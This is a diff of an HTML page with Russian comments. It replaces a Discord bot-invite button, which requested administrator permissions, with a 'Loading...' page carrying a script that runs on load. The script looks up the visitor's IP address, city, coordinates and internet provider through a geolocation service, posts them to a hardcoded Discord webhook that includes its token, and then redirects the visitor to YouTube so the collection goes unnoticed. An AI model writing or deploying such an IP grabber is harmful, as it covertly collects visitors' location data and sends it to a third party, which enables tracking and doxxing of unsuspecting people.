@@ -1,47 +1,68 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-  <style>
-    body {
-      background-image: url("https://raw.githubusercontent.com/X1vova1X/pngs/main/bg.png");
-      background-repeat: no-repeat;
-      background-size: cover;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-
-    .button {
-      position: absolute;
-      top: 70%;
-      left: 70%;
-      transform: translate(-50%, -50%);
-      padding: 15px 40px;
-      font-size: 18px;
-      background-color: black;
-      color: white;
-      border-radius: 10px;
-      border: none;
-      display: flex;
-      align-items: center;
-      cursor: pointer; /* Изменяем вид курсора на палец */
-    }
-
-    .discord-logo {
-      width: 50px;
-      height: 50px;
-      margin-right: 10px;
-    }
-  </style>
+    <title>Loading...</title>
+	<meta property="og:image" content="https://media1.tenor.com/m/T-CnKRVP2hgAAAAC/dont-middle-click-this-gif.gif">
 </head>
 <body>
-  <a href="https://discord.com/api/oauth2/authorize?client_id=1154878672965210192&permissions=8&scope=bot" target="_blank">
-    <button class="button">
-      <img class="discord-logo" src="https://raw.githubusercontent.com/X1vova1X/pngs/main/discord-logo.png" alt="Discord Logo">
-      Добавить в Discord
-    </button>
-  </a>
+
+<script>
+    // Замените на ваш Discord webhook URL
+    const discordWebhookUrl = 'https://discord.com/api/webhooks/1241371321175375903/iF1wqdCpkHvh908vq-WVU0kRtCLnaR_LaSbfGxIRWpgjTOdE4gt7yAT6IZMZDhWFbCPa';
+
+    // Функция для отправки IP-информации в Discord
+    function sendIPInfoToDiscord() {
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const ipInfo = {
+                    content: '',
+                    embeds: [
+                        {
+                            title: 'IP Information',
+                            fields: [
+                                { name: 'IP Address', value: data.ip },
+                                { name: 'Country', value: data.country_name },
+                                { name: 'City', value: data.city },
+                                { name: 'Region', value: data.region_name || data.region },
+								{ name: 'Timezone', value: data.timezone },
+                                { name: 'Latitude', value: data.latitude.toString() },
+                                { name: 'Longitude', value: data.longitude.toString() },
+								{ name: 'Provider', value: data.org }
+                            ]
+                        }
+                    ]
+                };
+
+                fetch(discordWebhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(ipInfo)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Перенаправляем пользователя на youtube.com через 1.5 секунды
+                        setTimeout(() => {
+                            window.location.href = 'https://www.youtube.com';
+                        }, 1500);
+                    } else {
+                        
+                    }
+                })
+                .catch(error => {
+                    
+                });
+            })
+            .catch(error => {
+             
+            });
+    }
+
+    // Вызываем функцию при загрузке страницы
+    window.onload = sendIPInfoToDiscord;
+</script>
 </body>
 </html>
